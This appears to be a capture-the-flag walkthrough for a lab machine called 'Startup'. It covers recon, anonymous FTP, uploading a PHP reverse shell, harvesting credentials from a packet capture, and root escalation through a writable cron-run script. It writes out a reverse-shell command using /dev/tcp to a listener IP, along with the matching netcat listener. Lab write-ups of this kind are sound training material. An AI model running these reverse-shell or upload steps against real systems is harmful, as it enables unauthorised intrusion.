# Startup 
Abuse traditional vulnerabilities via untraditional means.


## Recon 
`nmap -A -T4 10.80.181.70`

```
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp [NSE: writeable]
| -rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
|_-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
| ftp-syst: 
|   STAT: 
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b9:a6:0b:84:1d:22:01:a4:01:30:48:43:61:2b:ab:94 (RSA)
|   256 ec:13:25:8c:18:20:36:e6:ce:91:0e:16:26:eb:a2:be (ECDSA)
|_  256 a2:ff:2a:72:81:aa:a2:9f:55:a4:dc:92:23:e6:b4:3f (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Maintenance

```

## Improper Authentication

`ftp anonymous@10.80.171.70 21` 

With anonymous FTP login allowed, attackers can obtain knowledge of the server structure, read sensitive files and upload malicious files if the directory is writeable. In this case the ftp directory inside the service is writeable. 
Two files are available for download, which can be retrieved by running: `get important.jpg` and `get notice.txt`

- `important.jpg` is an Among Us meme 
- `notice.txt` is a note left, saying "Whoever is leaving these damn Among Us memes in this share, it IS NOT FUNNY. People downloading documents from our website will think we are a joke! Now I dont know who it is, but Maya is looking pretty sus." 

- A potential user has been enumerated: `Maya`


A web site is available via the HTTP protocol on port 80. Upon accessing the web server, a message is displayed by the Dev Team: "No spice here! Please excuse us as we develop our site. We want to make it the most stylish and convienient way to buy peppers. Plus, we need a web developer. BTW if you're a web developer, contact us. Otherwise, don't you worry. We'll be online shortly! — Dev Team"

## File and Directory Enumeration with Gobuster

`gobuster dir -u http://10.80.171.70 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt` 

```
files                (Status: 301) [Size: 312] [--> http://10.80.181.70/files/]
```

## Initial Access 
- A `/files` directory has been found where the FTP files are stored. Uploading a php reverse shell via ftp to the writeable ftp directory was succesful and the reverse shell was executed.
- Recipe.txt found: The secret spicy soup recipe is `love`
- Packet capture (.pcapng) file found within `incidents` directory. 

- Found credentials for user `lennie` inside .pcapng file and switched to user. 
- User flag obtained. 

## Privilege Escalation

- There's a `scripts` directory containing a `planner.sh` bash script file that contains the following code: 

```
#!/bin/bash
echo $LIST > /home/lennie/scripts/startup_list.txt
/etc/print.sh
```

- The bash script echoes output from the LIST variable which is written into the `startup_list.txt` file; and the `/etc/print.sh` script is called, therefore executed by root.

- Copied reverse shell command into `/etc/print.sh`: `echo "sh -i >& /dev/tcp/192.168.174.8/4444 0>&1" >> /etc/print.sh`
- Started a netcat listener with `nc -lvnp 4444` 
- The script runs after 1 minute. 

- Privileges have been escalated and root has been obtained!




